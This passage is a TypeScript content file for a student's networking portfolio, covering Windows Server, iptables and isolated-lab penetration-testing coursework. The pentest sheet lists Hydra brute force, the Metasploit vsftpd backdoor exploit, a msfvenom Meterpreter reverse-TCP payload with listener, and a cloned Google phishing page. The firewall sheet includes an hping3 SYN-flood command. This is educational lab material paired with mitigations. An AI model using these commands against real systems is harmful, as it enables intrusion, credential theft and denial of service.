// ============================================================================
// FICHIER DE CONTENU — MODIFIEZ TOUT ICI
// Les textes marqués « [À COMPLÉTER] » attendent vos informations : résultats
// observés, difficultés réelles, captures, rapports. Rien n'est inventé —
// chaque champ provisoire est conçu pour être remplacé par votre propre
// contenu. Les images se placent dans le dossier « public » du projet.
// ============================================================================

import type { FicheProjet, Formation } from '@/types';

export const profil = {
  nom: 'Dior Gaye',
  titre: 'Étudiante en Licence 3 Systèmes, Réseaux et Télécommunications',
  accroche:
    "Étudiante en Licence 3 Systèmes, Réseaux et Télécommunications à l'Université Alioune Diop de Bambey, je m'intéresse à l'administration des systèmes, aux infrastructures réseaux, aux services réseau et à la sécurité informatique. Ce portfolio rassemble mes projets académiques et mes travaux pratiques.",
  universite: 'Université Alioune Diop de Bambey',
  ville: 'Dakar, Sénégal',
  photoProfil: '/mon-photo.jpg',
};

export const aPropos = {
  titre: 'À propos',
  paragraphes: [
    "Étudiante en Licence 3 Systèmes, Réseaux et Télécommunications à l'Université Alioune Diop de Bambey (Sénégal), je consacre ma formation à la compréhension et à la mise en œuvre des infrastructures informatiques : administration des systèmes Windows et Linux, conception de réseaux, mise en place de services et sécurisation des environnements.",
    "Mon apprentissage repose essentiellement sur la pratique : configuration de serveurs, installation de services réseau sur Linux, simulation de topologies avec Cisco Packet Tracer et GNS3, et virtualisation de machines avec VMware. Les projets et travaux pratiques présentés dans ce portfolio reflètent ce parcours de formation.",
    "Je souhaite poursuivre dans les domaines de l'administration systèmes et réseaux et de la sécurité informatique, et mettre ces compétences au service d'une équipe professionnelle dans le cadre d'un stage ou d'un premier emploi.",
  ],
  pointsCles: [
    'Administration Windows Server et Linux',
    'Configuration et administration réseau',
    'Services réseau : DNS et DHCP',
    'Virtualisation avec VMware et GNS3',
    'Notions de sécurité informatique',
  ],
};

export const outils = [
  'Windows Server 2019',
  'Linux',
  'Cisco Packet Tracer',
  'VMware',
  'GNS3',
  'BIND9',
  'DNS / DHCP',
];

// Compétences, organisées par domaine. Les descriptions reprennent vos propres
// mots : complétez-les si vous souhaitez détailler davantage.
export const competences = [
  {
    titre: 'Administration système',
    icone: 'Server',
    elements: ['Windows Server 2019', 'Linux et administration système'],
  },
  {
    titre: 'Réseaux',
    icone: 'Network',
    elements: ['Configuration et administration réseau'],
  },
  {
    titre: 'Services réseau',
    icone: 'Globe',
    elements: ['DNS (BIND9)', 'DHCP'],
  },
  {
    titre: 'Virtualisation et simulation',
    icone: 'Layers',
    elements: ['VMware', 'GNS3', 'Cisco Packet Tracer'],
  },
  {
    titre: 'Sécurité informatique',
    icone: 'ShieldCheck',
    elements: ['Notions de sécurité informatique'],
  },
];

// ============================================================================
// FICHES PROJETS — les champs marqués [À COMPLÉTER] sont provisoires.
// Pour chaque image : placez le fichier dans « public » puis vérifiez que le
// chemin ci-dessous correspond à son nom. Laissez une galerie vide tant que
// vous n'avez pas de captures : des emplacements réservés s'affichent.
// ============================================================================
export const projets: FicheProjet[] = [
  {
    slug: 'windows-server-2019',
    titre: 'Administration Windows Server 2019',
    contexte: 'Travaux pratiques — Administration systèmes',
    periode: '2025 – 2026',
    statut: 'Projet de groupe · fiche complète',
    resume:
      "Mise en place et administration d'un environnement Windows Server 2019 dans le cadre des travaux pratiques de la licence : installation du système, configuration des rôles et gestion de l'environnement serveur.",
    problematique: "Comment installer deux serveurs Windows sur des machines virtuelles, les faire cohabiter dans un même domaine Active Directory, automatiser le nommage et l'adressage du réseau, puis protéger les données et contrôler les comptes ? Projet de groupe (groupe 54, encadré par Dr. Gaye) : les manipulations et les captures d'écran ont été réalisées par Dior Gaye.",
    objectifs: [
      "Installer deux serveurs Windows Server 2019 sur des machines virtuelles et leur attribuer une adresse IP statique",
      "Déployer Active Directory : domaine SRT2025G54.sn, puis second contrôleur de domaine",
      "Configurer le DNS (zones directe et inverse, hôtes, alias) et le DHCP (étendue, exclusions, bail)",
      "Mettre en place une sauvegarde planifiée avec quota disque, puis gérer des comptes et des groupes",
    ],
    environnement: [
      "Windows Server 2019 Standard Evaluation (machines virtuelles SRVP-G54 et SRVS-G54)",
      "Oracle VirtualBox (disques VDI dynamiquement alloués : 64 Go et 100 Go)",
      "Poste client Windows pour les tests DHCP et DNS",
      "Outils : Gestionnaire de serveur, Planificateur de tâches, Sauvegarde Windows Server, invite de commandes",
    ],
    schema: '/windows-server-schema.svg',
    schemaLegende:
      "Deux contrôleurs de domaine dans SRT2025G54.sn (réseau 192.168.26.0/24). Le serveur principal héberge aussi le DNS et le DHCP ; un poste client reçoit son adresse par DHCP.",
    etapes: [
      "Création des machines virtuelles dans VirtualBox et installation de Windows Server 2019",
      "Adresse IP statique (serveur principal : 192.168.26.54) et renommage en SRVP-G54 et SRVS-G54",
      "Ajout du rôle AD DS et promotion du serveur principal : nouvelle forêt SRT2025G54.sn",
      "Promotion du serveur secondaire en contrôleur de domaine du domaine existant et vérification dans Sites et services Active Directory",
      "DNS : zone directe DNSSRT2025G54.sn, zone inverse du réseau 192.168, 5 enregistrements d'hôtes avec PTR et 5 alias CNAME",
      "DHCP : étendue 192.168.26.1 à 192.168.26.80, exclusions, options routeur, domaine et DNS, autorisation du serveur",
      "Sauvegarde Windows Server : planification, script .bat lancé chaque jour par le Planificateur de tâches, quota de 15 Go sur le disque de sauvegarde",
      "Création des utilisateurs userFinance et userCompta et des groupes Finance et Compta, avec affectation des membres",
    ],
    commandes: [
      {
        titre: 'Diagnostic DHCP sur le poste client',
        commandes: [
          { commande: 'ipconfig /all', explication: "Afficher la configuration IP reçue du serveur DHCP" },
          { commande: 'ipconfig /release', explication: "Libérer l'adresse obtenue" },
          { commande: 'ipconfig /renew', explication: "Demander le renouvellement de l'adresse" },
        ],
      },
      {
        titre: 'Vérification de la résolution DNS',
        commandes: [
          { commande: 'nslookup', explication: "Interroger le serveur DNS : adresses 192.168.26.1 à .5 vers noms (BDserve, MESserve, FTPserve, IMPserve, APPserve) et alias" },
        ],
      },
    ],
    galerie: ["/img/ws-vm.jpg", "/img/ws-edition.jpg", "/img/ws-rename.jpg", "/img/ws-forest.jpg", "/img/ws-levels.jpg", "/img/ws-sites.jpg", "/img/ws-dyn.jpg", "/img/ws-host.jpg", "/img/ws-dhcp.jpg", "/img/ws-bail.jpg", "/img/ws-ns2.jpg", "/img/ws-ipc.jpg", "/img/ws-bat.jpg", "/img/ws-quota.jpg", "/img/ws-grp.jpg", "/img/ws-bkerr.jpg"],
    resultats: [
      "Résolution DNS vérifiée avec nslookup : noms, adresses et alias répondent",
      "Le poste client obtient une adresse du serveur DHCP ; ipconfig /release puis /renew fonctionnent",
      "Les deux serveurs SRVP-G54 et SRVS-G54 apparaissent dans Sites et services Active Directory",
      "Le groupe Compta contient userCompta et userFinance",
    ],
    difficultes: [
      {
        difficulte: "La sauvegarde a échoué faute de disque de destination disponible.",
        solution: "Ajout d'une partition sur l'espace alloué au serveur, puis reprise de la configuration de sauvegarde.",
      },
    ],
    competences: [
      "Installation et prise en main de Windows Server 2019",
      "Déploiement d'Active Directory et d'un second contrôleur de domaine",
      "Configuration DNS (zones directe et inverse) et DHCP",
      "Sauvegarde planifiée et quotas disque",
      "Gestion des utilisateurs et des groupes",
      "Diagnostic réseau avec ipconfig et nslookup",
    ],
    technologies: ['Windows Server 2019', 'Active Directory', 'DNS', 'DHCP', 'VirtualBox'],
    rapport: '/windows-server-rapport.pdf',
  },
  {
    slug: 'cybersecurite-laboratoire',
    titre: "Test d'intrusion en laboratoire isolé : reconnaissance, force brute, phishing et exploitation",
    contexte: 'TP académique — Cybersécurité offensive (Licence 3 SRT)',
    periode: '2025 – 2026',
    statut: 'Travail individuel · fiche complète',
    resume:
      "Simulation complète d'une chaîne d'attaque dans un laboratoire virtualisé et isolé : reconnaissance réseau avec Nmap, attaque par force brute avec Hydra, ingénierie sociale et phishing avec SET, puis exploitation d'une vulnérabilité connue et prise de contrôle à distance avec Metasploit et Meterpreter.",
    problematique:
      "Comment une machine mal protégée peut-elle être compromise, de la simple reconnaissance réseau jusqu'à la prise de contrôle complète ? L'objectif du TP est de reproduire, dans un cadre légal et encadré, les étapes qu'un attaquant suivrait réellement, afin de comprendre les failles exploitées et d'en déduire des mesures de protection concrètes.",
    cadreEthique:
      "Travail réalisé exclusivement dans un laboratoire virtualisé et isolé (machines virtuelles sans accès à un réseau de production), dans le cadre d'un TP encadré de Licence 3. Les techniques présentées ici (force brute, phishing, exploitation) ne sont légales qu'avec une autorisation explicite et dans un environnement fermé : hors de ce cadre, elles sont illégales. Aucun identifiant réel, aucune donnée personnelle authentique et aucun fichier malveillant fonctionnel ne sont publiés sur cette page.",
    objectifs: [
      "Scanner un réseau virtuel et identifier les machines actives, les ports ouverts et les services exposés avec Nmap",
      "Évaluer la robustesse d'identifiants de connexion par attaque de force brute avec Hydra (FTP, SSH, HTTP)",
      "Mettre en œuvre une attaque d'ingénierie sociale par clonage de page de connexion avec le Social-Engineer Toolkit (SET)",
      "Exploiter une vulnérabilité connue (porte dérobée vsftpd 2.3.4) avec Metasploit pour obtenir un accès à distance",
      "Configurer un écouteur Meterpreter et établir une connexion reverse TCP pour un contrôle complet de la machine cible",
      "Reproduire une partie de la chaîne d'attaque sur une topologie réseau segmentée avec des routeurs (GNS3)",
    ],
    environnement: [
      'Kali Linux (machine attaquante) : Nmap, Hydra, Social-Engineer Toolkit (SET), Metasploit Framework, msfvenom',
      'Metasploitable (cible volontairement vulnérable), machine Ubuntu et machine Windows (cibles configurées pour le TP)',
      'Réseau virtuel 192.168.1.0/24 (adressage statique par machine) ; simulation complémentaire sur une topologie à routeurs via GNS3',
      'Dictionnaires de mots de passe : fasttrack.txt et rockyou.txt (répertoire /usr/share/wordlists)',
    ],
    schema: '/securite-schema.svg',
    schemaLegende:
      "Quatre machines virtuelles sur le même réseau isolé 192.168.1.0/24 : Kali Linux (attaquant) face à Metasploitable, Ubuntu et Windows (cibles). Une partie du TP a ensuite été rejouée sur une topologie segmentée par deux routeurs (GNS3), avec un plan d'adressage distinct en 172.16.0.0/16 : les routeurs assurent le routage entre le segment de l'attaquant et celui des cibles. Dans cette simulation externe, l'attaquant écoute depuis l'adresse 172.16.0.1 (LHOST) et atteint Metasploitable via l'adresse 192.168.1.1 côté routeur.",
    etapes: [
      "Mise en place de 4 machines virtuelles et adressage IP statique de chacune (ifconfig / ip a / ipconfig selon le système)",
      "Vérification de la connectivité entre toutes les machines avec ping",
      "Reconnaissance réseau avec Nmap : balayage complet du réseau, puis scans ciblés (-F, ports spécifiques, -sV, -O, -A) pour identifier systèmes d'exploitation et versions de services",
      "Préparation des dictionnaires de mots de passe (fasttrack.txt, puis rockyou.txt) et attaque par force brute avec Hydra sur les services FTP, SSH et HTTP de Metasploitable, Ubuntu et Windows",
      "Vérification de l'accès obtenu avec les identifiants trouvés (connexion FTP et SSH)",
      "Mise en œuvre d'une attaque de phishing avec SET : clonage d'une page de connexion Google (credential harvester), hébergement local de la page piégée",
      "Simulation de l'envoi d'un lien piégé à la victime et observation des informations capturées côté attaquant",
      "Nouvelle reconnaissance ciblée avec Nmap pour préparer l'exploitation (option -A)",
      "Recherche d'un exploit correspondant au service vsftpd avec Metasploit (search, info), sélection et configuration du module (use, set RHOSTS)",
      "Exécution de l'exploit vsftpd_234_backdoor et obtention d'un shell de commande sur la machine cible",
      "Navigation dans le système compromis (ls, pwd, whoami, cd) puis transfert de fichiers dans les deux sens (download / upload) à titre de démonstration",
      "Génération d'un exécutable avec msfvenom (payload Meterpreter reverse_tcp) pour Windows puis pour Linux",
      "Configuration de l'écouteur avec le module multi/handler (set payload, LHOST, LPORT) et obtention d'une session Meterpreter",
      "Exploration des commandes Meterpreter (help, screenshot, navigation dans le système de fichiers de la cible)",
      "Reproduction d'une partie de la démarche (reconnaissance, phishing, exploitation) sur une topologie réseau avec routeurs configurés sous GNS3",
    ],
    commandes: [
      {
        titre: 'Reconnaissance réseau avec Nmap',
        commandes: [
          { commande: 'nmap 192.168.1.0/24', explication: "Balayer tout le réseau pour repérer les machines actives" },
          { commande: 'nmap -sV -A 192.168.1.5', explication: "Identifier les versions des services et le système d'exploitation de la cible (scan approfondi)" },
        ],
      },
      {
        titre: 'Force brute avec Hydra',
        commandes: [
          { commande: 'hydra -l msfadmin -P dictionnaire.txt ftp://192.168.1.5', explication: "Tester systématiquement les mots de passe du dictionnaire sur le compte msfadmin via FTP" },
        ],
      },
      {
        titre: "Exploitation avec Metasploit",
        commandes: [
          { commande: 'search vsftpd', explication: "Rechercher les modules Metasploit liés au service vsftpd identifié par Nmap" },
          { commande: 'use exploit/unix/ftp/vsftpd_234_backdoor', explication: "Charger le module exploitant la porte dérobée connue de vsftpd 2.3.4" },
          { commande: 'set RHOSTS 192.168.1.5', explication: "Indiquer l'adresse de la machine cible" },
          { commande: 'exploit', explication: "Lancer l'exploit et ouvrir une session de commande sur la cible" },
        ],
      },
      {
        titre: 'Reverse TCP et écouteur Meterpreter',
        commandes: [
          { commande: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f exe -o malware.txt', explication: "Générer un exécutable intégrant un payload Meterpreter qui se connectera à l'attaquant à l'exécution (le rapport nomme ce fichier « malware.txt » à la génération, puis « malware.exe » dans le texte explicatif, voir la limite signalée plus bas)" },
          { commande: 'use exploit/multi/handler', explication: "Préparer un écouteur générique pour recevoir la connexion du payload" },
          { commande: 'set payload windows/meterpreter/reverse_tcp', explication: "Définir le type de connexion attendue par l'écouteur" },
          { commande: 'set LHOST 192.168.1.2 / set LPORT 4444', explication: "Configurer l'adresse et le port d'écoute de l'attaquant" },
          { commande: 'exploit', explication: "Démarrer l'écoute ; une session Meterpreter s'ouvre dès que la cible exécute le fichier" },
        ],
      },
    ],
    galerie: [
      '/img/sec-nmap-scan.jpg', '/img/sec-nmap-detail.jpg', '/img/sec-wordlists.jpg', '/img/sec-hydra-success.jpg',
      '/img/sec-ssh-attempt.jpg', '/img/sec-set-html.jpg', '/img/sec-set-menu.jpg', '/img/sec-set-clone.jpg',
      '/img/sec-msf-banner.jpg', '/img/sec-msf-search.jpg', '/img/sec-msf-options.jpg', '/img/sec-msf-session.jpg',
      '/img/sec-msf-shell.jpg', '/img/sec-msfvenom.jpg', '/img/sec-meterpreter-handler.jpg', '/img/sec-meterpreter-help.jpg',
      '/img/sec-meterpreter-files.jpg', '/img/sec-topology.jpg', '/img/sec-exploit2.jpg', '/img/sec-exfil.jpg',
    ],
    resultats: [
      "Le scan Nmap a révélé les ports ouverts et les versions exactes des services sur les trois machines cibles (dont vsftpd 2.3.4, un service dont une porte dérobée est publiquement connue)",
      "L'attaque par force brute avec Hydra a permis de retrouver le mot de passe du compte msfadmin sur Metasploitable, confirmé par une connexion FTP et SSH réussie",
      "La page de connexion Google clonée avec SET a capturé, en simulation, le couple identifiant/mot de passe saisi par la machine cible",
      "L'exploit vsftpd_234_backdoor a ouvert une session de commande à distance sur Metasploitable, avec un contrôle suffisant pour naviguer dans le système de fichiers et transférer des fichiers",
      "Le payload Meterpreter généré avec msfvenom a établi une connexion reverse TCP fonctionnelle, démontrant un contrôle à distance complet de la machine Windows ciblée",
      "La même méthodologie (reconnaissance, phishing, exploitation) a pu être rejouée avec succès sur une topologie réseau segmentée par des routeurs sous GNS3",
    ],
    vulnerabilites: [
      { vulnerabilite: "Service vsftpd 2.3.4 avec porte dérobée connue publiquement", mesure: "Mettre à jour les services vers une version corrigée, désinstaller les services inutiles, surveiller l'intégrité des binaires" },
      { vulnerabilite: "Mots de passe faibles ou par défaut (ex. msfadmin, mots du dictionnaire rockyou.txt)", mesure: "Politique de mots de passe robustes, authentification multifacteur (MFA), verrouillage de compte après plusieurs échecs" },
      { vulnerabilite: "Aucune limitation des tentatives de connexion (force brute possible sans entrave)", mesure: "Fail2ban ou équivalent, limitation de débit, détection et alerte sur les tentatives répétées" },
      { vulnerabilite: "Services FTP et Telnet exposés, souvent en clair", mesure: "Désactiver Telnet et le FTP non chiffré, privilégier SFTP/FTPS ou un VPN, restreindre l'accès par pare-feu" },
      { vulnerabilite: "Vulnérabilité humaine face au phishing (page de connexion clonée)", mesure: "Sensibilisation des utilisateurs, authentification multifacteur, filtrage anti-phishing, vérification systématique de l'URL avant de saisir un mot de passe" },
      { vulnerabilite: "Exécution par la victime d'un fichier inconnu contenant un payload (reverse shell)", mesure: "Antivirus/EDR, liste blanche d'applications, sensibilisation à ne jamais exécuter de fichier reçu par un canal non vérifié" },
      { vulnerabilite: "Absence de segmentation réseau (toutes les machines sur le même sous-réseau)", mesure: "Segmentation en VLAN, pare-feu interne entre segments, principe du moindre privilège réseau" },
      { vulnerabilite: "Connexion sortante inhabituelle non détectée (reverse shell vers l'attaquant)", mesure: "Pare-feu sortant (filtrage de sortie), IDS/IPS, surveillance des journaux et des connexions réseau anormales" },
    ],
    limites: [
      "Le rapport mentionne l'option « -P- » pour la détection du système d'exploitation, alors que l'option standard de Nmap pour cela est « -O » (« -Pn » sert uniquement à désactiver le ping) : il s'agit d'une confusion à corriger.",
      "Une commande est notée « Nmap -Sv -0 » (majuscules et zéro au lieu de la lettre O) ; Nmap étant sensible à la casse, cette syntaxe précise ne fonctionnerait pas telle quelle dans un terminal.",
      "Le rapport décrit un port « fermé » comme une « connexion refusée » : en toute rigueur, un port Nmap « closed » signifie qu'un paquet de réponse a été reçu sans service à l'écoute, ce qui diffère d'un blocage actif par pare-feu (« filtered »).",
      "Le fichier généré par msfvenom est nommé « malware.txt » dans la commande (option -o) puis désigné « malware.exe » dans le texte explicatif : une incohérence de nommage qui gagnerait à être corrigée.",
      "La topologie de la simulation externe sous GNS3 (adressage 172.16.0.0/16, rôle des routeurs) est mentionnée mais peu détaillée dans le rapport ; une capture des tables de routage aurait renforcé la démonstration.",
      "Chaque partie se termine directement sur la suivante, sans mini-bilan intermédiaire ; une conclusion courte après chaque outil faciliterait la lecture d'un rapport déjà dense.",
    ],
    difficultes: [
      {
        difficulte: "Pour attaquer les machines Ubuntu et Windows avec Hydra, les services FTP, SSH et HTTP n'étaient pas installés par défaut.",
        solution: "Installation manuelle de ces services sur les deux machines avant de relancer les tests de force brute.",
      },
      {
        difficulte: "Le dictionnaire rockyou.txt est fourni compressé sur Kali Linux et n'est pas directement utilisable.",
        solution: "Décompression avec la commande gunzip, puis ajout du nom d'utilisateur ciblé en tête du fichier pour affiner le test.",
      },
    ],
    competences: [
      "Reconnaissance réseau et interprétation d'un scan Nmap (ports, services, versions, système d'exploitation)",
      "Évaluation de la robustesse de mots de passe par attaque de force brute (Hydra)",
      "Compréhension du vecteur d'ingénierie sociale et mise en œuvre d'une simulation de phishing (SET)",
      "Recherche et exploitation d'une vulnérabilité connue avec Metasploit (recherche de module, configuration, exécution)",
      "Génération de payloads et configuration d'un écouteur reverse TCP avec msfvenom et Meterpreter",
      "Lecture critique d'un rapport technique : identification d'incohérences et de pistes d'amélioration",
      "Association de chaque vulnérabilité exploitée à une mesure de protection concrète (approche défensive)",
    ],
    technologies: ['Nmap', 'Hydra', 'Metasploit', 'Social-Engineer Toolkit', 'Kali Linux', 'GNS3'],
    rapport: '/dossier-securite-expurge.pdf',
  },
  {
    slug: 'firewall-reseau-securise',
    titre: "Architecture réseau sécurisée : Firewall Linux, Port Forwarding et attaque SYN Flooding",
    contexte: 'Projet de réseaux — EC Routage & Commutation (Licence 3 SRT)',
    periode: '2025 – 2026',
    statut: 'Travail de groupe · matériel physique · fiche complète',
    resume:
      "Mise en place d'une architecture réseau sécurisée sur matériel physique : déploiement de services (Web, messagerie, DNS, TFTP), configuration d'un Firewall Linux avec IPTABLES, activation du Port Forwarding, puis démonstration d'une attaque par déni de service (SYN Flooding) et mise en place d'une protection.",
    problematique:
      "Comment séparer un réseau privé d'un réseau public à l'aide d'un Firewall Linux, permettre malgré tout l'accès à un service interne depuis l'extérieur (Port Forwarding), puis démontrer la vulnérabilité de ce service face à une attaque par saturation (SYN Flooding), avant d'y apporter une protection ?",
    cadreEthique:
      "Projet réalisé en groupe (groupe 2), sur du matériel physique en salle du département TIC, et évalué en direct par l'enseignant (Dr Diery Ngom). Ce TP n'a pas donné lieu à des captures d'écran : cette fiche s'appuie sur le sujet officiel du projet et sur le compte-rendu des manipulations fourni par l'étudiante.",
    objectifs: [
      "Déployer dans le réseau privé (LAN) des services réseau réels sous Linux : Web, messagerie, DNS et partage de fichiers (TFTP)",
      "Mettre en œuvre un routeur pare-feu Linux séparant le réseau privé du réseau public, à l'aide d'IPTABLES",
      "Configurer le NAT (MASQUERADE) pour permettre aux machines du réseau privé de communiquer vers l'extérieur",
      "Activer le Port Forwarding pour rendre accessible depuis le réseau public un service hébergé dans le réseau privé",
      "Lancer une attaque par saturation de type SYN Flooding (hping3) contre le serveur Web, et en constater l'effet",
      "Mettre en place une règle de limitation du trafic pour contourner cette attaque",
    ],
    environnement: [
      'Groupe 2 : réseau privé 192.168.2.0/24, passerelle 192.168.2.254',
      'Réseau public (simulant Internet) : 172.16.0.0/16, passerelle 172.16.0.1',
      'Machine Firewall Linux à deux interfaces (eth1 interne, eth0 externe), IPTABLES',
      'Serveur Web Apache déployé dans le réseau privé ; services SSH et Telnet installés sur le Firewall et une machine interne',
      "Outil hping3 pour la simulation de l'attaque SYN Flooding",
      'Matériel physique du département TIC (pas de machines virtuelles pour ce projet)',
    ],
    schema: '/reseau-firewall-schema.png',
    schemaLegende:
      "Schéma simplifié de l'architecture mise en place par le groupe 2 : un réseau privé (192.168.2.0/24) séparé d'un réseau public (172.16.0.0/16) par un Firewall Linux, avec un service Web rendu accessible depuis l'extérieur par Port Forwarding — et la cible de l'attaque SYN Flooding menée depuis le réseau public.",
    etapes: [
      "Configuration de l'adressage IP et de la table de routage de la machine cliente (passerelle 192.168.2.254)",
      "Configuration des deux interfaces réseau de la machine Firewall et activation du routage (ip_forward)",
      "Mise en place d'une machine dans le réseau public (172.16.0.0/16) et premiers tests de connectivité",
      "Activation du NAT (MASQUERADE) sur le Firewall pour permettre aux machines privées de joindre le réseau public",
      "Écriture des règles IPTABLES : politiques par défaut en rejet (DROP), puis autorisations explicites (web, DNS, SSH, Telnet, retour des connexions établies)",
      "Déploiement des services réels dans le réseau privé : serveur Web Apache, messagerie, DNS, TFTP",
      "Activation du Port Forwarding (règle DNAT) pour rediriger les requêtes HTTP du réseau public vers le serveur Web interne",
      "Tests d'accès aux services depuis le réseau public pour valider le fonctionnement du Port Forwarding",
      "Lancement d'une attaque SYN Flooding avec hping3 depuis le réseau public contre le service Web exposé",
      "Constat de l'indisponibilité du serveur Web pendant l'attaque, puis mise en place d'une règle de limitation du trafic SYN",
      "Nouveau test d'accès au service Web pour vérifier l'efficacité de la protection",
    ],
    commandes: [
      {
        titre: 'Activation du routage et du NAT sur le Firewall',
        commandes: [
          { commande: 'echo 1 > /proc/sys/net/ipv4/ip_forward', explication: "Activer le routage sur la machine Firewall, indispensable pour qu'elle puisse faire transiter le trafic entre les deux réseaux" },
          { commande: 'iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE', explication: "Activer le NAT : masquer les adresses du réseau privé derrière l'adresse publique du Firewall" },
        ],
      },
      {
        titre: 'Politique de filtrage par défaut (IPTABLES)',
        commandes: [
          { commande: 'iptables -P INPUT DROP ; iptables -P FORWARD DROP ; iptables -P OUTPUT DROP', explication: "Tout interdire par défaut, puis autoriser explicitement uniquement les flux nécessaires (règle de base en sécurité)" },
          { commande: 'iptables -A FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT', explication: "Autoriser le retour des connexions déjà établies depuis le réseau privé" },
        ],
      },
      {
        titre: 'Activation du Port Forwarding',
        commandes: [
          { commande: 'iptables -t nat -A PREROUTING -p tcp -i eth0 -d <IP_firewall> --dport 80 -j DNAT --to 192.168.2.Y', explication: "Rediriger les requêtes HTTP arrivant sur le Firewall depuis le réseau public vers le serveur Web du réseau privé" },
        ],
      },
      {
        titre: "Attaque SYN Flooding et protection",
        commandes: [
          { commande: 'hping3 -i u10 -S -p 80 -a 172.16.0.X 172.16.0.Y', explication: "Simuler, depuis le réseau public, une attaque par saturation de type SYN Flooding contre le service Web exposé" },
          { commande: 'iptables -A INPUT -p tcp --syn -m limit --limit 1/second --limit-burst 3 -j ACCEPT', explication: "Limiter le débit des nouvelles connexions TCP pour contenir l'attaque" },
          { commande: 'iptables -A INPUT -p tcp --syn -j DROP', explication: "Rejeter les connexions SYN excédentaires, au-delà de la limite autorisée" },
        ],
      },
    ],
    galerie: [],
    resultats: [
      "Les quatre services demandés (Web, messagerie, DNS, TFTP) ont été déployés dans le réseau privé",
      "Après correction d'un oubli d'activation du routage, la connectivité entre le réseau privé et le réseau public a fonctionné normalement",
      "Le Port Forwarding a fonctionné après une première phase de mise au point : le serveur Web interne est devenu accessible depuis le réseau public",
      "L'attaque SYN Flooding lancée avec hping3 a rendu le serveur Web inaccessible, démontrant concrètement la vulnérabilité d'un service exposé sans protection",
      "Après application des règles de limitation du trafic SYN, le test a été rejoué avec hping3 pour vérifier que le service restait accessible",
    ],
    difficultes: [
      {
        difficulte: "Au début de la manipulation, les ping entre le réseau privé et le réseau public ne fonctionnaient pas.",
        solution: "Le routage (ip_forward) n'avait pas été activé sur la machine Firewall ; son activation a résolu le problème de connectivité.",
      },
      {
        difficulte: "La configuration initiale du Port Forwarding ne permettait pas encore d'accéder au serveur Web depuis le réseau public.",
        solution: "Après vérification et correction de la règle de redirection (DNAT), l'accès au service a fonctionné.",
      },
    ],
    competences: [
      'Configuration et routage réseau sous Linux (interfaces, ip_forward)',
      'Filtrage de paquets avec IPTABLES (chaînes INPUT, OUTPUT, FORWARD)',
      'Translation d\'adresses (NAT / MASQUERADE) et Port Forwarding (DNAT)',
      'Déploiement de services réseau réels (Web, DNS, messagerie, TFTP) sous Linux',
      "Compréhension et démonstration d'une attaque par déni de service (SYN Flooding)",
      'Mise en place de règles de limitation de trafic pour contrer une attaque réseau',
      'Travail en équipe sur une infrastructure réseau physique, évalué en conditions réelles',
    ],
    technologies: ['Linux', 'IPTABLES', 'NAT', 'hping3', 'Apache', 'DNS', 'TFTP'],
    rapport: '',
  },
  {
    slug: 'dns-bind9-linux',
    masque: true,
    titre: 'Installation et configuration de DNS avec BIND9 sous Linux',
    contexte: 'Travaux pratiques — Services réseau',
    periode: 'Licence 3',
    statut: 'Fiche en cours de rédaction',
    resume:
      "Installation et configuration du serveur DNS BIND9 sous Linux, avec création de zones de résolution directe et inversée, dans le cadre des travaux pratiques sur les services réseau.",
    problematique:
      "[À COMPLÉTER] Décrivez la problématique : pourquoi mettre en place un serveur DNS, et ce que le TP visait à démontrer (résolution de noms directe et inversée sur un réseau local).",
    objectifs: [
      '[À COMPLÉTER] Exemple — Installer le service BIND9 sur un serveur Linux',
      '[À COMPLÉTER] Exemple — Configurer une zone directe et une zone inversée',
      '[À COMPLÉTER] Exemple — Vérifier la résolution de noms avec les outils de diagnostic',
    ],
    environnement: [
      'Linux (distribution utilisée : [À COMPLÉTER])',
      'BIND9 (serveur DNS)',
      '[À COMPLÉTER] Machines clientes pour les tests de résolution',
    ],
    schema: '/dns-bind9-schema.png',
    schemaLegende:
      '[À COMPLÉTER] Légende du schéma : placez « dns-bind9-schema.png » dans le dossier « public ».',
    etapes: [
      '[À COMPLÉTER] Installation du paquet BIND9',
      '[À COMPLÉTER] Configuration des options principales du service',
      '[À COMPLÉTER] Création de la zone de résolution directe et des enregistrements',
      '[À COMPLÉTER] Création de la zone de résolution inversée',
      '[À COMPLÉTER] Tests de résolution depuis les clients',
    ],
    commandes: [
      {
        titre: '[À COMPLÉTER] Exemple — Installation et vérification du service',
        commandes: [
          { commande: 'sudo apt install bind9 bind9utils', explication: 'Installer BIND9 et ses utilitaires' },
          { commande: 'systemctl status bind9', explication: "Vérifier l'état du service" },
        ],
      },
      {
        titre: '[À COMPLÉTER] Exemple — Tests de résolution',
        commandes: [
          { commande: 'nslookup nom-de-machine', explication: 'Tester la résolution directe' },
          { commande: 'dig -x adresse-ip', explication: 'Tester la résolution inversée' },
        ],
      },
    ],
    galerie: [],
    resultats: [
      '[À COMPLÉTER] Décrivez uniquement ce que vous avez réellement obtenu : zones chargées, tests réussis ou échoués, limites constatées.',
    ],
    difficultes: [
      {
        difficulte: '[À COMPLÉTER] Décrivez une difficulté réellement rencontrée (ex. : erreur dans un fichier de zone)',
        solution: '[À COMPLÉTER] Expliquez comment vous l’avez résolue (ou indiquez « non résolue »)',
      },
    ],
    competences: [
      'Installation et configuration de BIND9',
      'Création de zones DNS directes et inversées',
      'Utilisation des outils de diagnostic DNS (nslookup, dig)',
    ],
    technologies: ['Linux', 'BIND9', 'DNS'],
    rapport: '',
  },
  {
    slug: 'reseaux-cisco-packet-tracer',
    masque: true,
    titre: 'Conception et configuration de réseaux avec Cisco Packet Tracer',
    contexte: 'Travaux pratiques — Réseaux',
    periode: 'Licence 3',
    statut: 'Fiche en cours de rédaction',
    resume:
      "Conception de topologies réseau et configuration d'équipements avec Cisco Packet Tracer : adressage, routage et vérification de la connectivité entre les postes et les réseaux simulés.",
    problematique:
      "[À COMPLÉTER] Décrivez la problématique : quelle topologie fallait-il concevoir, et quelles contraintes d'adressage ou de routage le TP devait-il couvrir.",
    objectifs: [
      '[À COMPLÉTER] Exemple — Concevoir une topologie comportant plusieurs réseaux',
      "[À COMPLÉTER] Exemple — Définir et appliquer un plan d'adressage IP",
      '[À COMPLÉTER] Exemple — Configurer le routage entre les réseaux',
      '[À COMPLÉTER] Exemple — Vérifier la connectivité de bout en bout',
    ],
    environnement: [
      'Cisco Packet Tracer',
      '[À COMPLÉTER] Équipements utilisés (routeurs, commutateurs, postes)',
    ],
    schema: '/cisco-packet-tracer-schema.png',
    schemaLegende:
